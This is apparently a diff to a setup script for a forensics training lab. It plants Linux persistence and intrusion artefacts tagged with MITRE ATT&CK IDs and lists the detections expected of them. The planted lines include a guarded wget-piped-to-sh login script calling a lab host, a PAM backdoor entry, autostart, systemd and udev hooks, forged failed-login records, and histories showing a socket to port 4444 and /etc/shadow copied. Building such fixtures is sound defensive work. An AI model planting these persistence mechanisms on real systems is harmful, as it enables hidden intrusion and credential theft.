@@ -63,6 +63,40 @@ while [ $i -le 20 ]; do
 done
 echo "Oct 24 03:20:00 lab sshd[1999]: Accepted password for gandalf from 198.51.100.77 port 50999 ssh2" >> /var/log/auth.log
 
+# Persistence and history artefacts beyond the core set (process/linux_artefacts.py).
+# All inert: nothing here runs on a container (no udevd, no desktop, no systemd),
+# and the profile.d line is guarded by a variable that's never set.
+mkdir -p /etc/profile.d /etc/pam.d /etc/udev/rules.d /etc/systemd/system-generators \
+    "$H/.config/autostart" "$H/.config/systemd/user" /var/tmp
+# T1546.004: download-and-run in a login script
+echo '[ -n "${RIVENDELL_LAB_NEVER_SET:-}" ] && wget -qO- http://update.rivendell-lab.test/p | sh' > /etc/profile.d/lab-update.sh
+# T1556.003: a PAM stack for a service nothing uses, with a module outside the security directory
+echo 'auth sufficient /tmp/.x/pam_lab.so' > /etc/pam.d/lab-backdoor
+# T1547.013 / T1543.002: XDG autostart and a systemd user unit
+printf '[Desktop Entry]\nType=Application\nName=Lab Updater\nExec=/tmp/.x/update.sh\n' > "$H/.config/autostart/lab-updater.desktop"
+printf '[Unit]\nDescription=Lab agent\n[Service]\nExecStart=/tmp/.x/update.sh\n[Install]\nWantedBy=default.target\n' > "$H/.config/systemd/user/lab-agent.service"
+# T1546.017: udev rule that runs a staged script
+echo 'ACTION=="add", SUBSYSTEM=="usb", RUN+="/bin/sh -c '"'"'/tmp/.x/update.sh'"'"'"' > /etc/udev/rules.d/99-lab-usb.rules
+# T1543.002: a systemd generator
+printf '#!/bin/sh\nexit 0\n' > /etc/systemd/system-generators/lab-gen
+chmod 0755 /etc/systemd/system-generators/lab-gen
+# An ELF binary in a temp directory (a copy of true)
+cp /bin/true /var/tmp/.lab-elf
+# T1110.001: btmp with 12 failed root logins from a documentation address
+python3 - <<'PY'
+import struct, time
+rec = struct.Struct("<hxxi32s4s32s256shhiii16s20x")
+with open("/var/log/btmp", "wb") as out:
+    for i in range(12):
+        out.write(rec.pack(6, 2000 + i, b"ssh:notty", b"", b"root", b"198.51.100.77", 0, 0, 0,
+                           int(time.time()) - 3600 + i, 0, bytes([198, 51, 100, 77]) + b"\0" * 12))
+PY
+chmod 0600 /var/log/btmp
+# Shell and tool histories beyond bash
+printf '_HiStOrY_V2_\nselect\\040*\\040from\\040wp_users;\n' > "$H/.mysql_history"
+printf 'import socket\nsocket.create_connection(("198.51.100.23", 4444))\n' > "$H/.python_history"
+printf '# Command Line History (newest to oldest):\n:w /tmp/.x/shadow.bak\n# File marks:\n'"'"'0  1  0  /etc/shadow\n' > "$H/.viminfo"
+
 chown -R gandalf:gandalf "$H" 2>/dev/null || chown -R gandalf "$H"
 chmod 700 "$H/.ssh"
 chmod 600 "$H/.ssh/authorized_keys"
@@ -78,7 +112,18 @@ cat > /etc/rivendell-lab/expected.json <<'EOF'
     {"path": "/tmp/.x/update.sh", "attack": "T1105", "yara": ["Suspicious_Network_Activity"]},
     {"path": "/tmp/.x/notes.txt", "keywords": ["password", "secret", "api_key"]},
     {"path": "/var/www/html/status.php", "attack": "T1505.003", "yara": ["Suspicious_PowerShell_Command"]},
-    {"path": "/var/log/auth.log", "attack": "T1110.001", "expect": ["198.51.100.77"]}
+    {"path": "/var/log/auth.log", "attack": "T1110.001", "expect": ["198.51.100.77"]},
+    {"path": "/etc/profile.d/lab-update.sh", "attack": "T1546.004", "cooked": "shell_init.csv"},
+    {"path": "/etc/pam.d/lab-backdoor", "attack": "T1556.003", "cooked": "pam.csv"},
+    {"path": "/etc/sudoers.d/gandalf", "attack": "T1548.003", "cooked": "sudoers.csv"},
+    {"path": "/home/gandalf/.config/autostart/lab-updater.desktop", "attack": "T1547.013", "cooked": "autostart.csv"},
+    {"path": "/home/gandalf/.config/systemd/user/lab-agent.service", "attack": "T1543.002", "cooked": "autostart.csv"},
+    {"path": "/etc/udev/rules.d/99-lab-usb.rules", "attack": "T1546.017", "cooked": "udev_rules.csv"},
+    {"path": "/etc/systemd/system-generators/lab-gen", "attack": "T1543.002", "cooked": "generators.csv"},
+    {"path": "/var/tmp/.lab-elf", "cooked": "tmp_executables.csv"},
+    {"path": "/var/log/btmp", "attack": "T1110.001", "cooked": "login_records.csv", "expect": ["198.51.100.77"]},
+    {"path": "/home/gandalf/.mysql_history", "cooked": "shell_histories.csv", "expect": ["wp_users"]},
+    {"path": "/home/gandalf/.viminfo", "cooked": "viminfo.csv", "expect": ["/etc/shadow"]}
   ],
   "iocs": ["198.51.100.23", "198.51.100.77", "c2.rivendell-lab.test", "update.rivendell-lab.test"]
 }
